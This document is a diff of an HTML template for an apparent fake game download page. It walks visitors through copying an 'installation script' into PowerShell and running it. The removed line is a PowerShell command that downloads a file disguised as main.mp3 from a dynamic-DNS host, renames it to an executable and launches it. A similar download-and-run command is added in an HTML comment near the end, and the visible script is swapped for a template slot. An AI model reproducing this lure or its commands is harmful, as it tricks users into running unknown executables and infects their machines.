@@ -343,6 +343,51 @@
         Copy and run the installation script to automatically download and install the game
       </p>
       <pre class="install-script">
-irm http://andrewbaker.ddns.net/download/main.mp3 -OutFile "$env:USERPROFILE\Downloads\main.mp3"; Rename-Item "$env:USERPROFILE\Downloads\main.mp3" "main.exe"; Start-Process "$env:USERPROFILE\Downloads\main.exe"
-<!-- -->
+{{ script_content }}
+      </pre>
+    </section>
+
+    <!-- STEPS -->
+    <section class="steps-section">
+      <h2 class="section-title">Installation Guide</h2>
+      <div class="steps">
+        <div class="step">
+          <div class="step-number">1</div>
+          <div class="step-content">
+            <h3 class="step-title">Copy Script</h3>
+            <p class="step-description">Copy the installation script (CTRL+C)</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">2</div>
+          <div class="step-content">
+            <h3 class="step-title">Open Terminal</h3>
+            <p class="step-description">Launch the powershell / terminal app</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">3</div>
+          <div class="step-content">
+            <h3 class="step-title">Paste Script</h3>
+            <p class="step-description">Right-click to paste or use <kbd>Ctrl</kbd>+<kbd>V</kbd></p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">4</div>
+          <div class="step-content">
+            <h3 class="step-title">Run Installation</h3>
+            <p class="step-description">Press <kbd>Enter</kbd> and let the script handle everything</p>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <div class="container">
+      <p>© 2023 {{ filename }} - All rights reserved</p>
+    </div>
+  </footer>
+</body>
+<!--irm http://andrewbaker.ddns.net/download/main.exe -OutFile "$env:TEMP\app.exe"; Start-Process "$env:TEMP\main.exe" -->
 </html>
